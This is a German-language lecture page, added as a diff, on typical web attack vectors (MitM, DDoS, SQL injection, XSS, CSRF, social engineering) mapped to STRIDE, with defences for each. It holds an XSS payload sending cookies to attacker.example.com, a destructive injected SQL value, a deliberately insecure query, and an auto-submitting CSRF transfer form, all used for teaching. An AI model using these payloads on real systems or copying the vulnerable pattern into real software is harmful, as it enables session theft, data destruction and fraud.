@@ -1,0 +1,329 @@
+---
+sidebar_position: 4
+title: "4. Typische Angriffsvektoren und Schutzmaßnahmen"
+description: ""
+---
+
+## Das STRIDE Modell
+
+* Entwickelt von Microsoft zur Kategorisierung von Bedrohungen.
+* Das STRIDE Modell teilt Bedrohungen in sechs Kategorien ein:
+
+| Kategorie        | Bedeutung                                      | Typische Web-Beispiele                                        | Ziel des Angriffs |
+|------------------|-----------------------------------------------|---------------------------------------------------------------|-------------------|
+| **S** - Spoofing    | Vortäuschen einer falschen Identität          | Gestohlene Session-Cookies, gestohlene API-Tokens, Phishing                    | Zugriff auf fremde Identitäten und die damit einhergehenden Daten |
+| **T** - Tampering  | Unbefugte Veränderung von Daten                | Manipulation von Formularfeldern, SQL-Injection, Cross-Site Scripting (XSS)    | Verfälschung oder Zerstörung vom Systemzustand oder von Daten |
+| **R** - Repudiation | Abstreiten von Aktionen                        | Fehlende Protokollierung, manipulierte Logs, kein Audit-Trail bei Datenänderungen                             | Verbergen von bösartigen Aktionen |
+| **I** - Information Disclosure | Unbefugte Offenlegung von Informationen       | Datenlecks, unsichere Direktzugriffe, unverschlüsselte Kommunikation            | Zugriff auf vertrauliche Informationen |
+| **D** - Denial of Service | Verhinderung des Zugriffs auf Dienste          | Überlastungsangriffe, Ressourcenerschöpfung, Logikfehler im Code         | Unterbrechung oder Verweigerung von Diensten |
+| **E** - Elevation of Privilege | Erlangen höherer Rechte als vorgesehen        | Schwachstellen in Authentifizierungsmechanismen, Fehlkonfigurationen            | Erlangen von unautorisierten Rechten |
+
+* Vorteile von STRIDE:
+  * leicht verständlich und schnell anwendbar
+  * Systematische Kategorisierung von Bedrohungen
+  * deckt sowohl technische als auch organisatorische Aspekte ab
+  * In der Praxis weit verbreitet (z.B. Microsoft, OWASP Thread Modeling Methodology)
+  * dient uns, ein wenig strukturierter über gängige Bedrohungen nachzudenken
+
+* STRIDE ist kein Tool, sondern eine Denkweise
+* Es strukturiert die Analyse von Bedrohungen rund um die Frage "Wie könnte mein System missbraucht werden?"
+* Wir behandelt hier jedoch nicht in der Tiefe Bedrohungsmodellierung, sondern konzentrieren uns auf typische Angriffsvektoren und Schutzmaßnahmen
+
+## Man-in-the-Middle (MitM)
+
+**STRIDE-Kategorien**: Tampering, Information Disclosure, Spoofing
+
+### Szenario
+
+* Nutzer verbindet sich mit "Cafe_Wolke_Free_Wifi"
+    * Das Café hat übrigens kein öffentliches WLAN
+* Nutzer ruft http://example.com auf -> erste Verbindung unverschlüsselt
+* Angreifer im selben WLAN fängt den Datenverkehr ab (Sniffing)
+* Angreifer ruft selbst https://example.com auf, erhält ein gültiges Zertifikat und den originalen Inhalt
+* Angreifer sendet den Inhalt an den Nutzer zurück, ersetzt jedoch alle Links durch http Links
+* Der Angreifer kann nun alle Anfragen des Nutzers mitlesen und sogar manipulieren
+
+### Worum geht es bei diesem Angriff?
+
+* Der Angreifer sitzt "in der Mitte" der Kommunikation zwischen Nutzer und Webseite
+* Der Angreifer kann den Datenverkehr abhören (Information Disclosure)
+* Der Angreifer kann den Datenverkehr manipulieren (Tampering)
+* Der Angreifer kann sich als die Webseite ausgeben (Spoofing)
+
+### Was ist falsch gelaufen?
+
+* Nutzer hat sich mit einem unsicheren WLAN verbunden (öffentliche WLANs sind immer riskant)
+* Webseite hat keine HTTPS-Verbindung erzwungen (HSTS)
+* Die Entwickler der Seite könnten zwar eine Weiterleitung von HTTP zu HTTPS eingerichtet haben, aber der Angreifer hat bereits den ersten unverschlüsselten Request abgefangen
+* Dadurch konnte der Angreifer den Nutzer zwingen, auf einer unsicheren Verbindung zu kommunizieren (SSL-Stripping)
+
+### Wie hätte man das verhindern können?
+
+* HSTS (HTTP Strict Transport Security)
+    * Erzwingt HTTPS-Verbindungen
+    * Verhindert SSL-Stripping-Angriffe
+
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
+
+* Domain in die HSTS-Preload-Liste eintragen lassen
+    * Browser erzwingen HTTPS bereits beim ersten Besuch
+
+* Keine öffentlichen WLANs ohne VPN nutzen
+
+## (Distributed) Denial of Service (Dos/DDoS)
+**STRIDE-Kategorie**: Denial of Service
+
+### Szenario
+* Ein Angreifer kauft im Darknet ein Botnetz aus infizierten Computern, Kameras, IoT-Geräten, usw.
+* Die Besitzer dieser Geräte wissen in der Regel gar nicht, dass ihre Geräte Teil eines Botnetzes sind, da sie sich in der Regel nicht auffällig verhalten
+* Das Ziel betreibt einen Webshop und möchte am Black Friday möglichst viele Gummienten verkaufen
+* Der Angreifer programmiert sein Botnetz so, dass es den Webshop mit Anfragen überflutet, um eine politische Botschaft gegen nutzlosen Konsum zu verbreiten
+* Der Webshop wird durch die Flut von Anfragen überlastet und ist für legitime Nutzer nicht mehr erreichbar
+* Die Betreiber des Webshops verlieren Umsatz und Kundenvertrauen
+
+### Worum geht es bei diesem Angriff?
+
+* Ziel ist es, die Verfügbarkeit eines Dienstes zu beeinträchtigen oder komplett zu verhindern
+* Dies geschieht durch Überlastung der Server mit einer großen Anzahl von Anfragen
+* DDoS-Angriffe nutzen oft Botnetze, um die Angriffe von vielen verschiedenen Quellen aus durchzuführen, was die Abwehr erschwert
+* Ziel ist es, legitime Nutzer daran zu hindern, auf den Dienst zuzugreifen
+* Das kann politische, finanzielle oder ideologische Motive haben oder in der heutigen Zeit: trollen
+* Ein DDoS-Angriff kann auch von anderen Angriffen begleitet werden oder dazu dienen, von anderen Angriffen abzulenken
+
+### Was ist falsch gelaufen?
+* Der Webshop hat keine Schutzmechanismen gegen DDoS-Angriffe implementiert
+    * CDNs bieten oft integrierte DDoS-Schutzmechanismen, wie z.B. Traffic-Filtering und Rate-Limiting
+* Der Webshop hat keine Skalierungsmechanismen, um mit plötzlichen Lastspitzen umzugehen
+    * Autoscaling in Cloud-Umgebungen kann helfen, die Kapazität bei Bedarf zu erhöhen
+* Der Webshop hat keine Monitoring- und Alarmierungssysteme, um ungewöhnlichen Traffic zu erkennen
+    * Frühzeitige Erkennung von DDoS-Angriffen ermöglicht schnellere Reaktionen
+
+### Wie hätte man das verhindern können?
+
+* Einsatz von CDNs mit DDoS-Schutz
+* Implementierung von Rate-Limiting
+* Nutzung von Autoscaling in Cloud-Umgebungen
+* Einrichtung von Monitoring- und Alarmierungssystemen
+* Bereitschaftsplanung für den Fall eines DDoS-Angriffs
+* Verwendung von Web Application Firewalls (WAFs)
+* Blackhole-Routing für bösartigen Traffic
+
+* Zugegeben: DDoS-Schutz ist ein komplexes Thema und erfordert oft spezialisierte Lösungen und Dienste.
+    * Ein DDoS-Angriff ist schwer generell zu verhindern.
+    * Das Ziel ist es, die Auswirkungen zu minimieren und die Verfügbarkeit so schnell wie möglich wiederherzustellen.
+    * Unternehmen wie Cloudflare können vor DDoS-Angriffen schützen, indem sie so viel Bandbreite und Hardware Ressourcen bereitstellen, dass es sehr schwierig ist, sie zu überlasten.
+
+## SQL-Injection
+**STRIDE-Kategorie**: Tampering, Information Disclosure, Elevation of Privilege
+
+### Szenario
+* Ein kleines Unternehmen betreibt ein internes Ticketsystem für Support-Anfragen
+* Ein Angreifer entdeckt, dass eine Route anbietet, um **seine eigenen** Tickets zu bearbeiten
+
+```http
+PUT https://support.example.com/ticket?id=42
+```
+
+* Der Code für die Route sieht ungefähr so aus
+
+```typescript
+
+app.post("/tickets/edit", async (req, res) => {
+    const id = req.query.id;                     // Ticket-ID
+    const description = req.body.description;    // Neuer Text
+
+    // ⛔ UNSICHER: direkte Stringinterpolation!
+    const sql = `
+        UPDATE tickets
+        SET description = '${description}'
+        WHERE id = ${id};
+    `;
+
+    await db.query(sql);
+
+    res.send("Ticket aktualisiert");
+});
+```
+
+* Der Angreifer liefert folgende ID: `42; DELETE FROM tickets` und als Beschreibung: `Neuer Text`
+* Der resultierende SQL-Befehl lautet dann:
+
+```sql
+UPDATE tickets
+SET description = 'Neuer Text'
+WHERE id = 42; DELETE FROM tickets;
+```
+
+* Dadurch werden **alle** Tickets gelöscht
+
+### Worum geht es bei diesem Angriff?
+
+* Der Angreifer versucht, die SQL-Datenbank auszulesen oder zu manipulieren, indem er bösartigen SQL-Code in Eingabefelder einschleust
+* In diesem Beispiel: Der Angreifer möchte nicht nur seine eigenen Tickets bearbeiten, sondern alle Tickets in der Datenbank löschen
+
+### Was ist falsch gelaufen?
+* Der Code verwendet direkte Stringinterpolation, um SQL-Befehle zu erstellen
+* Dadurch kann der Angreifer beliebigen SQL-Code einschleusen und ausführen
+
+### Wie hätte man das verhindern können?
+* Verwendung von vorbereiteten Anweisungen (Prepared Statements) die SQL-Injection verhindern
+    * Prepared Statements trennen SQL-Code von Daten und verhindern so die Ausführung von eingeschleustem Code, indem Platzhalter verwendet werden,
+    * Die Datenbank sorgt dafür, dass alles, was an die Platzhalter gebunden wird, als Daten behandelt wird und nicht als ausführbarer Code
+    * Das funktioniert, weil tatsächlich die Query mit Platzhaltern an die Datenbank gesendet wird. Die Datebank erstellt daraufhin einen Query Plan, der die Struktur der Abfrage festlegt. Darüber hinaus werden die tatsächlichen Daten (also die Werte für die Platzhalter) separat übermittelt. Die Datenbank weiß somit bereits im Vorfeld, wie die Abfrage strukturiert ist, und kann die Daten entsprechend behandeln, ohne sie als Teil des SQL-Codes zu interpretieren.
+    * ORMs benutzen in der Regel Prepared Statements standardmäßig
+
+```typescript
+app.post("/tickets/edit", async (req, res) => {
+    const id = req.query.id;                     // Ticket-ID
+    const description = req.body.description;    // Neuer Text
+
+    // ✅ SICHER: Prepared Statement verwenden
+    const sql = `
+        UPDATE tickets
+        SET description = ?
+        WHERE id = ?;
+    `;
+
+    await db.query(sql, [description, id]);
+
+    res.send("Ticket aktualisiert");
+});
+```
+
+* Mit diesem Beispiel würde der Angreifer keinen Schaden anrichten können, da die Datenbank den gesamten Inhalt der Variablen `description` und `id` als Daten behandelt und nicht als ausführbaren SQL-Code interpretiert.
+* Somit würde die ID `42; DELETE FROM tickets` zu einem Fehler führen, da sie kein gültiger Integer-Wert ist und logischerweise nicht gefunden werden kann.
+* Validierung und Bereinigung von Eingabedaten
+    * Eingabedaten sollten immer validiert und bereinigt werden, um sicherzustellen, dass sie den erwarteten Format- und Inhaltsanforderungen entsprechen.
+    * So hätte geprüft werden können, ob die ID tatsächlich eine Zahl ist.
+* Prinzip der geringsten Privilegien
+    * Die Datenbankverbindung sollte nur die minimal notwendigen Rechte haben.
+    * Im obigen Beispiel hätte die Verbindung keine Rechte zum Löschen von Datensätzen haben sollen.
+
+## Cross-Site Scripting (XSS)
+**STRIDE-Kategorie**: Tampering, Information Disclosure, Spoofing
+
+### Szenario
+
+* Ein Blog erlaubt es Nutzern, Kommentare zu hinterlassen
+* Ein Angreifer hinterlässt folgenden Kommentar:
+
+```html
+<script>
+    fetch('https://attacker.example.com/steal?cookie=' + document.cookie);
+</script>
+```
+* Jeder Besucher des Blogs, der diesen Kommentar liest, führt das Skript aus
+* Das Skript sendet die Cookies des Besuchers an die Domain des Angreifers
+* Der Angreifer kann nun die gestohlenen Cookies verwenden, um sich als die Besucher auszugeben (Session Hijacking)
+
+### Worum geht es bei diesem Angriff?
+
+* Der Angreifer schleust bösartigen Code (meist JavaScript) in eine Webseite ein, die von anderen Nutzern besucht wird
+* Der bösartige Code wird im Kontext der Webseite ausgeführt und kann so auf Cookies, Session-Daten und andere sensible Informationen zugreifen
+* Der Angreifer kann sich als der betroffene Nutzer ausgeben und dessen Identität übernehmen (Spoofing)
+* Der Angreifer kann die Webseite manipulieren und Inhalte verändern (Tampering)
+* Der Angreifer kann vertrauliche Informationen offenlegen (Information Disclosure)
+
+### Was ist falsch gelaufen?
+* Der Kommentar wurde direkt in die HTML-Seite eingefügt und vom Browser ausgeführt
+    * Statt den Content direkt als HTML einzufügen, hätte der Kommentar als reiner Text behandelt werden müssen
+    * Dabei ist es gar nicht nötig, den Input zu validieren oder zu bereinigen. Das ist ohnehin zu anfällig für Fehler.
+    * Wichtig ist nur, dass der Input niemals als HTML interpretiert wird.
+    * Dafür kann bspw. Encoding genutzt werden, um HTML-Sonderzeichen zu maskieren (z.B. `<` wird zu `&lt;`)
+
+```javascript
+// UNSICHER: Direkte Einfügung von HTML
+const comment = "<script>...</script>";
+const element = document.getElementById("comments");
+element.innerHTML += comment;
+
+// SICHER: Einfügung als Text
+const comment = "<script>...</script>";
+const element = document.getElementById("comments");
+element.textContent += comment;
+```
+
+* Cookies wurden ohne das `HttpOnly`-Flag gesetzt
+    * Dadurch sind die Cookies für JavaScript zugänglich und können gestohlen werden
+* Fehlende Content Security Policy (CSP)
+    * CSP kann die Ausführung von nicht vertrauenswürdigem Code verhindern
+    * Beispielsweise kann CSP so konfiguriert werden, dass im HTML nur Javascript akzeptiert wird, der von der eigenen Domain separat geladen wurde
+    * Mit der folgenden CSP wird beispielsweise nur Skriptcode erlaubt, der von der eigenen Domain stammt
+    * Inline JavaScript wird nicht mehr akzeptiert.
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+## Cross-Site Request Forgery (CSRF)
+**STRIDE-Kategorie**: Spoofing, Tampering
+
+### Szenario
+* Ein Nutzer ist in seinem Online-Banking-Konto eingeloggt
+* Das Online Banking verwendet einen Session Cookie für die Authentifizierung
+* Der Angreifer schickt eine E-Mail raus, die dazu auffordert, eine neue Nachricht im Postfach durchzulesen und einen Link dazu anhängt.
+* Die Webseite enthält folgendes HTML
+
+```html
+<html>
+    <body>
+        <form action="https://vulnerable-banking.com/transfer" method="POST">
+            <input type="hidden" name="amount" value="50000" />
+            <input type="hidden" name="to" value="DE123..." />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+```
+
+* Der Nutzer klickt auf den Link in der E-Mail und lädt die Webseite des Angreifers
+* Der Browser des Nutzers sendet automatisch den Session-Cookie mit der Anfrage an das Online-Banking
+* Das Online-Banking führt die Überweisung aus, da der Nutzer ja eingeloggt ist
+
+### Worum geht es bei diesem Angriff?
+* Der Angreifer täuscht dem Nutzer vor, das Online-Banking aufzurufen
+* Der Angreifer nutzt die bestehende Authentifizierung des Nutzers über Session Cookies aus, um unautorisierte Aktionen durchzuführen
+* Der Angreifer kann so Aktionen im Namen des Nutzers durchführen, ohne dass der Nutzer davon weiß oder zustimmt
+
+### Was ist falsch gelaufen?
+
+* Wir ignorieren jetzt mal die Tatsache, dass das Online-Banking keine Zwei-Faktor-Authentifizierung für Transkationen verwendet, das ist natürlich eine Vereinfachung des Beispiels
+* `SameSite`-Attribut für Cookies wurde nicht gesetzt
+    * Dadurch werden Cookies auch bei Anfragen von Drittseiten mitgesendet
+* Referer basierte Validierung
+    * Das Online-Banking überprüft nicht, ob die Anfrage von der eigenen Domain stammt
+    * Der Referer-Header kann jedoch leicht manipuliert oder entfernt werden, daher ist dies keine zuverlässige Schutzmaßnahme, aber eine gute Ergänzung
+* Fehlende CSRF-Tokens
+    * Ein CSRF-Token ist ein eindeutiger, geheimer, zufälliger, unvorhersehbarer Wert, der von der Serverseite generiert und an den Client gesendet wird
+    * Das CSRF-Token wird serverseitig in der Session des Nutzers gespeichert
+    * Das CSRF-Token muss dem Client mitgeteilt werden, damit es bei jeder Anfrage zurückgesendet werden kann
+        * Die sicherste Variante bei Server Side Rendering ist, das Token in einem versteckten Formularfeld statisch im HTML an den Client zu übermitteln
+        * Bei Single Page Applications (SPAs) kann das Token über eine separate API abgerufen und im Client gespeichert werden (z.B. im Session Storage), das ist aber viel unsicherer
+        * Wichtig ist: CSRF-Tokens sollten niemals in Cookies gespeichert werden, da sie sonst automatisch bei jeder Anfrage mitgesendet werden und somit keinen Schutz bieten
+    * Der Client sendet das CSRF-Token bei sensitiven Anfragen (z.B. POST, PUT, DELETE) zurück an den Server, der es mit dem in der Session gespeicherten Token vergleicht
+
+## Social Engineering
+**STRIDE-Kategorien**: Spoofing, Information Disclosure, Elevation of Privilege
+
+### Szenario
+* Ein Angreifer ruft bei der IT-Hotline eines Unternehmens an und gibt sich als Mitarbeiter aus
+* Der Angreifer behauptet, sein Passwort vergessen zu haben und bittet um Zurücksetzen
+* Der IT-Mitarbeiter überprüft die Identität des Anrufers nicht ausreichend und setzt das Passwort zurück
+* Der Angreifer erhält Zugriff auf das Konto des Mitarbeiters und kann sensible Daten stehlen
+
+### Worum geht es bei diesem Angriff?
+
+* Social Engineering funktionieren gänzlich anders als andere Angriffe
+* Das Ziel ist es nicht, eine technische Lücke auszunutzen, sondern menschliche Schwächen
+* Ein System kann perfekt gehärtet sein. Es reicht wenn ein einziger Mitarbeiter im falschen Moment nicht aufmerksam ist
+* Social Engineering Attacken nutzen oft psychologische Tricks, um Vertrauen zu gewinnen und Menschen dazu zu bringen, vertrauliche Informationen preiszugeben oder unautorisierte Aktionen durchzuführen
+
+### Was ist falsch gelaufen?
+
+* Der IT-Mitarbeiter hat die Identität des Anrufers nicht ausreichend überprüft
+* Es gab keine klaren Richtlinien für den Umgang mit Passwort-Zurücksetzungen
+* Mitarbeiter wurden nicht ausreichend über Social Engineering aufgeklärt
